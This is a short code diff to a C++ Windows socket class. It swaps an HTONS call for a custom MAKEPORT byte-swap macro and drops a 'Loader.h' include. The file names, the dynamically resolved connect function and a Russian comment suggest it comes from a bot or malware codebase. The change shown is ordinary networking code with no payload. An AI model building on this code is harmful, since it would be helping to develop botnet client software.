@@ -2,7 +2,7 @@
 
 #pragma hdrstop
 
-#include "Loader.h"
+
 #include "Memory.h"
 #include "BotSocket.h"
 
@@ -91,6 +91,8 @@ void TWinSocket::Close()
 	Socket = INVALID_SOCKET;
 }
 
+#define MAKEPORT(x) (((x) << 8) | ((x) >> 8))
+
 bool TWinSocket::DoConnect(const char *HostName, WORD Port, DWORD Timeout)
 {
 	if (Timeout == 0) Timeout = 60 * 60;// 1 hour
@@ -125,7 +127,7 @@ bool TWinSocket::DoConnect(const char *HostName, WORD Port, DWORD Timeout)
 
 		SockAddr.sin_family      = AF_INET;
 		SockAddr.sin_addr.s_addr = **(unsigned long**)lpHost->h_addr_list;
-		SockAddr.sin_port        = HTONS((unsigned short)Port );
+		SockAddr.sin_port        = MAKEPORT((unsigned short)Port );
 
 		// подключаемся к хосту
 		int   connect_result = (int)pconnect( Socket, (const struct sockaddr*)&SockAddr, sizeof( SockAddr ) );
